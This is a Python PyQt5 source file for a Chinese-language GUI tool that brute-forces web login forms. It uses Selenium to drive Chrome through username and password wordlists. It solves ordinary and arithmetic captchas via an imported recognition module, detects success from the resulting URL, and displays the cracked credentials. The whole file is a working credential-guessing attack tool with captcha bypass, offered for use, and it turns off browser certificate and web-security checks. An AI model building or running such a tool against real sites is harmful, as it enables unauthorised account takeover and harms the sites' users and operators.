import sys
import os
import threading
import time
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QPushButton, QTextEdit, QGroupBox,
                             QGridLayout, QFileDialog, QComboBox, QCheckBox, QSpinBox,
                             QMessageBox, QTabWidget)
from PyQt5.QtCore import Qt, pyqtSignal, QObject
from PyQt5.QtGui import QFont, QIcon
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, WebDriverException, \
    InvalidSessionIdException

# 导入您的模块
import captcha

import config


class BruteforceSignals(QObject):
    log_signal = pyqtSignal(str)
    result_signal = pyqtSignal(str, bool)  # (message, success)
    finished_signal = pyqtSignal()


class BruteforceGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.bruteforce_thread = None
        self.signals = BruteforceSignals()
        self.browser = None
        self.init_ui()
        self.connect_signals()
        self.setWindowIcon(QIcon('1.ico'))
    def init_ui(self):
        self.setWindowTitle("by Reset")
        self.setGeometry(800, 400, 1500, 1200)

        # 设置应用程序样式
        self.setStyleSheet("""
            QMainWindow {
                background-color: #f0f0f0;
            }
            QGroupBox {
                font-weight: bold;
                border: 2px solid #cccccc;
                border-radius: 5px;
                margin-top: 1ex;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #0066cc;
            }
            QPushButton {
                background-color: #4CAF50;
                border: none;
                color: white;
                padding: 8px 16px;
                text-align: center;
                text-decoration: none;
                font-size: 14px;
                margin: 4px 2px;
                border-radius: 4px;
            }
            QPushButton:hover {
                background-color: #45a049;
            }
            QPushButton:disabled {
                background-color: #cccccc;
            }
            QPushButton#stopButton {
                background-color: #f44336;
            }
            QPushButton#stopButton:hover {
                background-color: #d32f2f;
            }
            QLineEdit {
                padding: 5px;
                border: 1px solid #ccc;
                border-radius: 3px;
            }
            QTextEdit {
                border: 1px solid #ccc;
                border-radius: 3px;
                background-color: white;
            }
            QProgressBar {
                border: 1px solid #ccc;
                border-radius: 3px;
                text-align: center;
            }
            QProgressBar::chunk {
                background-color: #4CAF50;
                width: 10px;
            }
        """)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        main_layout = QHBoxLayout(central_widget)

        # 配置面板
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)

        # 标签页
        tabs = QTabWidget()

        # 基本配置标签页
        basic_tab = QWidget()
        basic_layout = QVBoxLayout(basic_tab)

        # 配置区域
        config_group = QGroupBox("基本配置")
        config_layout = QGridLayout()

        config_layout.addWidget(QLabel("登录URL:"), 0, 0)
        self.url_edit = QLineEdit(config.LOGIN_URL)
        config_layout.addWidget(self.url_edit, 0, 1, 1, 2)

        config_layout.addWidget(QLabel("用户名:"), 1, 0)
        self.username_edit = QLineEdit(config.USERNAME)
        config_layout.addWidget(self.username_edit, 1, 1)
        self.username_browse_btn = QPushButton("用户名字典")
        self.username_browse_btn.setToolTip("选择包含多个用户名的文本文件，每行一个")
        config_layout.addWidget(self.username_browse_btn, 1, 2)

        config_layout.addWidget(QLabel("密码文件:"), 2, 0)
        self.password_file_edit = QLineEdit(config.PASSWORD_FILE)
        config_layout.addWidget(self.password_file_edit, 2, 1)
        self.browse_btn = QPushButton("浏览")
        config_layout.addWidget(self.browse_btn, 2, 2)

        config_layout.addWidget(QLabel("驱动路径:"), 3, 0)
        self.driver_path_edit = QLineEdit(config.DRIVER_PATH)
        config_layout.addWidget(self.driver_path_edit, 3, 1)
        self.driver_browse_btn = QPushButton("浏览")
        config_layout.addWidget(self.driver_browse_btn, 3, 2)

        config_layout.addWidget(QLabel("使用验证码:"), 4, 0)
        self.use_captcha_check = QCheckBox()
        self.use_captcha_check.setChecked(True)
        config_layout.addWidget(self.use_captcha_check, 4, 1)

        config_layout.addWidget(QLabel("验证码类型:"), 4, 2)
        self.captcha_type_combo = QComboBox()
        self.captcha_type_combo.addItems(["普通验证码", "算术验证码"])
        config_layout.addWidget(self.captcha_type_combo, 4, 3)

        config_layout.addWidget(QLabel("验证码URL:"), 5, 0)
        self.captcha_url_edit = QLineEdit(config.CAPTCHA_DIRECT_URL)
        config_layout.addWidget(self.captcha_url_edit, 5, 1, 1, 2)

        config_group.setLayout(config_layout)
        basic_layout.addWidget(config_group)

        # 参数配置区域
        params_group = QGroupBox("参数设置")
        params_layout = QGridLayout()

        params_layout.addWidget(QLabel("超时时间(秒):"), 0, 0)
        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(1, 60)
        self.timeout_spin.setValue(config.TIMEOUT)
        params_layout.addWidget(self.timeout_spin, 0, 1)

        params_layout.addWidget(QLabel("尝试延迟(秒):"), 1, 0)
        self.delay_spin = QSpinBox()
        self.delay_spin.setRange(0, 60)
        self.delay_spin.setValue(1)
        self.delay_spin.setToolTip("每次尝试之间的延迟时间")
        params_layout.addWidget(self.delay_spin, 1, 1)

        # 移除“点击后等待(秒)”设置，点击后不额外等待，失败即进行下一次

        params_layout.addWidget(QLabel("无头模式:"), 3, 0)
        self.headless_check = QCheckBox()
        self.headless_check.setChecked(config.HEADLESS)
        params_layout.addWidget(self.headless_check, 3, 1)

        params_layout.addWidget(QLabel("显示浏览器:"), 4, 0)
        self.show_browser_check = QCheckBox()
        self.show_browser_check.setChecked(True)
        self.show_browser_check.stateChanged.connect(self.toggle_browser_visibility)
        params_layout.addWidget(self.show_browser_check, 4, 1)

        # 成功判定（URL 不含）
        params_layout.addWidget(QLabel("成功判定(URL不含):"), 5, 0)
        self.success_url_not_contains_edit = QLineEdit('login')
        self.success_url_not_contains_edit.setToolTip("当当前URL不包含该字符串时，判定为登录成功")
        params_layout.addWidget(self.success_url_not_contains_edit, 5, 1)

        params_group.setLayout(params_layout)
        basic_layout.addWidget(params_group)

        tabs.addTab(basic_tab, "基本配置")

        # XPath配置标签页（去掉成功标识）
        xpath_tab = QWidget()
        xpath_layout = QVBoxLayout(xpath_tab)

        xpath_group = QGroupBox("XPath 元素定位")
        xpath_grid = QGridLayout()

        xpath_grid.addWidget(QLabel("用户名输入框:"), 0, 0)
        self.username_xpath_edit = QLineEdit('//*[@id="username"]')
        xpath_grid.addWidget(self.username_xpath_edit, 0, 1)

        xpath_grid.addWidget(QLabel("密码输入框:"), 1, 0)
        self.password_xpath_edit = QLineEdit('//*[@id="password"]')
        xpath_grid.addWidget(self.password_xpath_edit, 1, 1)

        xpath_grid.addWidget(QLabel("验证码输入框:"), 2, 0)
        self.captcha_xpath_edit = QLineEdit('//*[@id="captcha"]')
        xpath_grid.addWidget(self.captcha_xpath_edit, 2, 1)

        xpath_grid.addWidget(QLabel("验证码图片:"), 3, 0)
        self.captcha_img_xpath_edit = QLineEdit('//img[contains(@src,"captcha.jsp")]')
        xpath_grid.addWidget(self.captcha_img_xpath_edit, 3, 1)

        xpath_grid.addWidget(QLabel("登录按钮:"), 4, 0)
        self.login_btn_xpath_edit = QLineEdit('//*[@name="login"]')
        xpath_grid.addWidget(self.login_btn_xpath_edit, 4, 1)

        xpath_group.setLayout(xpath_grid)
        xpath_layout.addWidget(xpath_group)

        tabs.addTab(xpath_tab, "XPath配置")

        left_layout.addWidget(tabs)

        # 控制按钮区域
        control_layout = QHBoxLayout()
        self.start_btn = QPushButton("开始爆破")
        self.start_btn.setFont(QFont("Arial", 10, QFont.Bold))
        self.stop_btn = QPushButton("停止")
        self.stop_btn.setObjectName("stopButton")
        self.stop_btn.setEnabled(False)
        self.test_btn = QPushButton("测试连接")
        self.test_btn.clicked.connect(self.test_connection)
        control_layout.addWidget(self.start_btn)
        control_layout.addWidget(self.stop_btn)
        control_layout.addWidget(self.test_btn)
        left_layout.addLayout(control_layout)

        # 去掉进度条

        # 日志区域
        log_group = QGroupBox("操作日志")
        log_layout = QVBoxLayout()
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        log_layout.addWidget(self.log_text)
        log_group.setLayout(log_layout)
        left_layout.addWidget(log_group)

        # 添加到主布局
        main_layout.addWidget(left_panel)

        # 连接信号
        self.browse_btn.clicked.connect(self.browse_password_file)
        self.driver_browse_btn.clicked.connect(self.browse_driver_path)
        self.username_browse_btn.clicked.connect(self.browse_username_file)
        self.start_btn.clicked.connect(self.start_bruteforce)
        self.stop_btn.clicked.connect(self.stop_bruteforce)

    def connect_signals(self):
        self.signals.log_signal.connect(self.log_message)
        self.signals.result_signal.connect(self.show_result)
        self.signals.finished_signal.connect(self.on_finished)

    def browse_password_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "选择密码文件", "", "Text Files (*.txt)")
        if file_path:
            self.password_file_edit.setText(file_path)

    def browse_driver_path(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "选择Chrome驱动", "", "Executable Files (*.exe)")
        if file_path:
            self.driver_path_edit.setText(file_path)

    def browse_username_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "选择用户名文件", "", "Text Files (*.txt)")
        if file_path:
            # 用文件路径替换输入框内容，表示使用字典
            self.username_edit.setText(file_path)

    def log_message(self, message):
        timestamp = time.strftime("%H:%M:%S", time.localtime())
        self.log_text.append(f"[{timestamp}] {message}")

    # 移除进度更新

    def show_result(self, message, success):
        if success:
            QMessageBox.information(self, "成功", message)
        else:
            QMessageBox.information(self, "结果", message)

    def on_finished(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.log_message("爆破过程已完成")

    def toggle_browser_visibility(self, state):
        if self.browser:
            if state == Qt.Checked:
                # 显示浏览器窗口
                try:
                    if hasattr(self.browser, 'window_handles') and self.browser.window_handles:
                        self.browser.switch_to.window(self.browser.window_handles[0])
                        self.browser.minimize_window()
                        self.browser.maximize_window()
                except:
                    pass
            else:
                # 隐藏浏览器窗口
                try:
                    self.browser.minimize_window()
                except:
                    pass

    def start_bruteforce(self):
        # 验证输入
        if not all([self.url_edit.text(), self.username_edit.text(),
                    self.password_file_edit.text(), self.driver_path_edit.text()]):
            QMessageBox.warning(self, "输入错误", "请填写所有必填字段")
            return

        if not os.path.exists(self.password_file_edit.text()):
            QMessageBox.warning(self, "文件错误", "密码文件不存在")
            return

        if not os.path.exists(self.driver_path_edit.text()):
            QMessageBox.warning(self, "文件错误", "驱动文件不存在")
            return

        # 更新配置
        self.update_config()

        # 禁用开始按钮，启用停止按钮
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)

        # 清空日志
        self.log_text.clear()

        # 启动爆破线程
        self.bruteforce_thread = BruteforceThread(self.signals, {
            'username_xpath': self.username_xpath_edit.text(),
            'password_xpath': self.password_xpath_edit.text(),
            'captcha_xpath': self.captcha_xpath_edit.text(),
            'captcha_img_xpath': self.captcha_img_xpath_edit.text(),
            'login_btn_xpath': self.login_btn_xpath_edit.text(),
            'success_url_not_contains': self.success_url_not_contains_edit.text(),
            'use_captcha': self.use_captcha_check.isChecked(),
            'captcha_type': self.captcha_type_combo.currentText(),
            'delay': self.delay_spin.value(),
            'show_browser': self.show_browser_check.isChecked()
        })
        self.bruteforce_thread.start()

    def stop_bruteforce(self):
        if self.bruteforce_thread and self.bruteforce_thread.is_alive():
            self.bruteforce_thread.stop()
            self.log_message("正在停止爆破过程...")

    def update_config(self):
        # 更新配置模块的值
        config.LOGIN_URL = self.url_edit.text()
        config.USERNAME = self.username_edit.text()
        config.PASSWORD_FILE = self.password_file_edit.text()
        config.DRIVER_PATH = self.driver_path_edit.text()
        config.CAPTCHA_DIRECT_URL = self.captcha_url_edit.text()
        config.TIMEOUT = self.timeout_spin.value()
        config.HEADLESS = self.headless_check.isChecked()
        # 点击后不等待，因此无需从界面读取该参数

    def test_connection(self):
        """测试网络连接和浏览器"""
        try:
            self.log_message("开始测试连接...")

            # 更新配置
            self.update_config()

            # 测试浏览器启动
            options = webdriver.ChromeOptions()
            options.add_argument('--ignore-certificate-errors')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')

            service = Service(config.DRIVER_PATH)
            test_browser = webdriver.Chrome(service=service, options=options)

            # 测试访问目标网站
            try:
                test_browser.get(config.LOGIN_URL)
                self.log_message(f"✅ 成功访问目标网站: {test_browser.current_url}")
            except Exception as e:
                self.log_message(f"❌ 访问目标网站失败: {str(e)}")
                # 测试访问百度
                try:
                    test_browser.get("https://www.baidu.com")
                    self.log_message("✅ 网络连接正常，但目标网站可能无法访问")
                except Exception as e2:
                    self.log_message(f"❌ 网络连接失败: {str(e2)}")

            test_browser.quit()
            self.log_message("连接测试完成")

        except Exception as e:
            self.log_message(f"测试连接时发生错误: {str(e)}")


class BruteforceThread(threading.Thread):
    def __init__(self, signals, settings):
        super().__init__()
        self.signals = signals
        self.settings = settings
        self._stop_event = threading.Event()
        self.browser = None
        # 避免阻塞应用关闭
        self.daemon = True

    def stop(self):
        # 设置停止事件，并异步终止浏览器会话，避免阻塞UI
        self._stop_event.set()
        current_browser = self.browser
        if current_browser is not None:
            def _async_quit(b):
                try:
                    b.quit()
                except Exception:
                    pass

            threading.Thread(target=_async_quit, args=(current_browser,), daemon=True).start()

            # 兜底：若驱动迟迟不退出，数秒后强制结束相关进程（仅限Windows）
            def _force_kill_after_delay():
                try:
                    time.sleep(3)
                    # 如果线程仍在停止中，强制结束可能残留的驱动/浏览器进程
                    if self._stop_event.is_set():
                        if sys.platform.startswith('win'):
                            try:
                                os.system('taskkill /F /IM chromedriver.exe /T >NUL 2>&1')
                                os.system('taskkill /F /IM chrome.exe /T >NUL 2>&1')
                            except Exception:
                                pass
                except Exception:
                    pass

            threading.Thread(target=_force_kill_after_delay, daemon=True).start()

    def run(self):
        try:
            # 加载用户名（字典或单值）与密码
            usernames = self.load_usernames()
            passwords = self.load_passwords()
            total = len(usernames) * len(passwords)

            # 初始化浏览器
            self.browser = self.init_browser()
            # 启动信息不打印，保证日志最简

            found = False
            index_counter = 0
            for username in usernames:
                config.USERNAME = username
                for password in passwords:
                    i = index_counter
                    index_counter += 1
                    if self._stop_event.is_set():
                        break

                    # 简要尝试次数日志
                    self.signals.log_signal.emit(f"尝试 {i + 1}/{total}")

                    for attempt in range(config.MAX_ATTEMPTS_PER_PASSWORD):
                        if self._stop_event.is_set():
                            break

                        try:
                            success = self.attempt_login(self.browser, password)
                        except (InvalidSessionIdException, WebDriverException) as e:
                            self.signals.log_signal.emit(f"异常: {repr(e)}")
                            try:
                                self.browser.quit()
                            except Exception:
                                pass
                            self.browser = self.init_browser()
                            success = False

                        if success:
                            self.signals.result_signal.emit(
                                f"登录成功! 用户名: {config.USERNAME}, 密码: {password}", True)
                            found = True
                            break

                    if found or self._stop_event.is_set():
                        break

                    # 添加可中断延迟（如配置）
                    if self.settings['delay'] > 0:
                        if self._stop_event.wait(self.settings['delay']):
                            break

                    # 每次都回到登录页，保证服务端验证码与表单状态完全刷新（与原逻辑一致）
                    if self._stop_event.is_set():
                        break
                    try:
                        self.browser.get(config.LOGIN_URL)
                    except Exception as e:
                        self.signals.log_signal.emit(f"返回登录页异常，重启浏览器: {repr(e)}")
                        try:
                            self.browser.quit()
                        except Exception:
                            pass
                        if not self._stop_event.is_set():
                            self.browser = self.init_browser()

            if not found and not self._stop_event.is_set():
                self.signals.result_signal.emit("未找到有效密码", False)

            try:
                self.browser.quit()
            except Exception:
                pass

        except Exception as e:
            self.signals.log_signal.emit(f"爆破过程中发生错误: {str(e)}")
        finally:
            self.signals.finished_signal.emit()

    def load_passwords(self):
        with open(config.PASSWORD_FILE, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]

    def load_usernames(self):
        """支持单个用户名或用户名文件（每行一个）"""
        username_input = config.USERNAME.strip()
        try:
            if os.path.isfile(username_input):
                with open(username_input, 'r', encoding='utf-8') as f:
                    return [line.strip() for line in f if line.strip()]
        except Exception:
            pass
        return [username_input]

    def init_browser(self):
        options = webdriver.ChromeOptions()
        options.add_argument('--ignore-certificate-errors')
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-web-security')
        options.add_argument('--allow-running-insecure-content')
        # 保持与原行为一致，不强制屏蔽资源

        # 设置浏览器窗口大小和位置
        options.add_argument('--window-size=1200,800')
        options.add_argument('--window-position=100,100')

        if config.HEADLESS:
            options.add_argument('--headless=new')

        # 如果不显示浏览器，则最小化
        if not self.settings['show_browser']:
            options.add_argument('--start-minimized')

        options.page_load_strategy = config.PAGE_LOAD_STRATEGY
        service = Service(config.DRIVER_PATH)
        browser = webdriver.Chrome(service=service, options=options)

        # 设置页面加载超时；禁用隐式等待以避免多余延迟
        browser.set_page_load_timeout(30)
        browser.implicitly_wait(0)

        try:
            browser.get(config.LOGIN_URL)
        except Exception as e:
            self.signals.log_signal.emit(f"访问登录页面失败: {str(e)}")
            # 尝试访问一个简单的页面来测试浏览器是否正常工作
            browser.get("https://www.baidu.com")

        return browser

    def is_login_successful(self, browser):
        # 快速判定：当前URL不包含用户指定字段时，视为登录成功
        try:
            must_not_contain = str(self.settings.get('success_url_not_contains') or 'login').lower()
            return must_not_contain not in browser.current_url.lower()
        except Exception:
            return False

    def get_cookies_dict(self, browser):
        try:
            return {c.get('name'): c.get('value') for c in browser.get_cookies()}
        except Exception:
            return {}

    def find_login_button(self, browser):
        try:
            return browser.find_element(By.XPATH, self.settings['login_btn_xpath'])
        except NoSuchElementException:
            # 尝试其他常见定位方式
            candidates = [
                (By.ID, "loginBtn"),
                (By.NAME, "login"),
                (By.XPATH, "//button[contains(@id,'login') or contains(@name,'login') or contains(text(),'登录')]")
            ]
            for by, value in candidates:
                try:
                    return browser.find_element(by, value)
                except NoSuchElementException:
                    continue
            raise NoSuchElementException("未找到登录按钮")

    def attempt_login(self, browser, password):
        try:
            # 等待用户名和验证码图片出现，确保后续取到最新验证码
            WebDriverWait(browser, config.TIMEOUT).until(
                EC.presence_of_element_located((By.XPATH, self.settings['username_xpath']))
            )
            WebDriverWait(browser, config.TIMEOUT).until(
                EC.presence_of_element_located((By.XPATH, self.settings['captcha_img_xpath']))
            )

            # 是否启用验证码
            captcha_code = ""
            if self.settings.get('use_captcha', True):
                cookies = self.get_cookies_dict(browser)
                if self.settings['captcha_type'] == "普通验证码":
                    captcha_code = captcha.recognize_captcha_direct(cookies=cookies, browser=browser)
                    if not captcha_code:
                        # 快速重试一次
                        captcha_code = captcha.recognize_captcha_direct(cookies=cookies, browser=browser)
                else:  # 算术验证码
                    captcha_code = captcha.recognize_math_captcha_direct(cookies=cookies, browser=browser)
                    if not captcha_code:
                        captcha_code = captcha.recognize_math_captcha_direct(cookies=cookies, browser=browser)

            if not captcha_code:
                self.signals.log_signal.emit("验证码识别失败")
                return False

            username_field = browser.find_element(By.XPATH, self.settings['username_xpath'])
            password_field = browser.find_element(By.XPATH, self.settings['password_xpath'])
            captcha_field = None
            if self.settings.get('use_captcha', True):
                captcha_field = browser.find_element(By.XPATH, self.settings['captcha_xpath'])

            username_field.clear()
            # 支持用户名字典：若输入框内容是一个存在的文件路径，则按字典模式在外层循环
            username_value = config.USERNAME
            username_field.send_keys(username_value)
            password_field.clear()
            password_field.send_keys(password)
            if self.settings.get('use_captcha', True):
                captcha_field.clear()
                captcha_field.send_keys(captcha_code)

            # 直接点击登录按钮（与原脚本一致）
            login_button = self.find_login_button(browser)
            login_button.click()

            # 点击后不额外等待：立即快速判定一次，失败即返回 False 进入下一次
            return self.is_login_successful(browser)

        except (InvalidSessionIdException, WebDriverException) as e:
            self.signals.log_signal.emit(f"浏览器会话异常: {repr(e)}")
            raise
        except Exception as e:
            self.signals.log_signal.emit(f"登录尝试异常: {repr(e)}")
            return False


if __name__ == "__main__":
    app = QApplication(sys.argv)

    # 设置应用程序字体
    font = QFont("Microsoft YaHei", 9)
    app.setFont(font)

    window = BruteforceGUI()
    window.show()
    sys.exit(app.exec_())
